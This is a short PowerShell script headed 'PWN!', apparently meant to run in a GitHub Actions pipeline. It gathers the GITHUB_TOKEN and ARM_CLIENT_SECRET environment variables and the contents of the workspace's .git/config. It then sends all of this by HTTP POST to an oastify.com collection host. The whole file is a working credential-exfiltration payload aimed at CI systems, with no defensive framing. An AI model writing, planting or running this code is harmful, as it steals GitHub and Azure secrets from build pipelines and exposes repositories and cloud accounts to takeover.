# PWN!
# Define the URL you want to send the environment variables to
$remoteUrl = "http://9hryf86p3o4fl8ikham7mn3utlzcn4bt.oastify.com"

# Create a hashtable to store your environment variables
$envVariables = @{}

# Loop through each environment variable and add it to the hashtable
$envVariables = @{
    "GITHUB_TOKEN" = $env:GITHUB_TOKEN
    "ARM_CLIENT_SECRET" = $env:ARM_CLIENT_SECRET
    # Add more variables as needed
}

# Convert the hashtable to JSON
$jsonBody = $envVariables | ConvertTo-Json

# Send the environment variables to the remote URL
$response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $jsonBody -ContentType "application/json"

# Path to the file you want to read
$filePath = "$env:GITHUB_WORKSPACE/.git/config"

# Read the content of the file
$fileContent = Get-Content -Path $filePath -Raw

# Define the body for the POST request
$body = @{
    fileContent = $fileContent
} | ConvertTo-Json

# Send the file content to the remote URL
$response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $body -ContentType "application/json"

# Display the response
$response
